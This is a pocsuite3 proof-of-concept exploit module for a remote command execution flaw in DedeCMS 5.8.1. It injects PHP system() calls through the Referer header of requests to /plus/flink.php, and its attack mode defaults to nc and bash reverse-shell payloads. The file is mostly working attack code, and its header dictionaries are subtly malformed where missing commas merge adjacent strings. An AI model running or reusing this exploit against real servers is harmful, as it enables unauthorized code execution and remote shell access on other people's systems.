from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import json,random,time
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = 'DedeCMS common.func.php 远程命令执行漏洞'
    appName = 'DedeCMS'
    appVersion = '5.8.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''DedeCMS common.func.php 远程命令执行漏洞'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': '<?php "system"(ls);?>'
            'Accept-Encoding:' 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6',
            'Connection': 'close',
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
        }
        try:
            target = self.url+"/plus/flink.php?dopost=save"
            r = requests.get(url=target,timeout=8,verify=False,headers=headers)
            if r.status_code == 200 and "list" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        print(cmd)
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': '<?php "system"({});?>'.format(cmd),
            'Accept-Encoding:' 'gzip, deflate'
            'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6',
            'Connection': 'close',
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
        }
        try:
            target = self.url+"/plus/flink.php?dopost=save"
            r = requests.get(url=target,timeout=8,verify=False,headers=headers)
            if r.status_code == 200 :
                print(r.text)
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)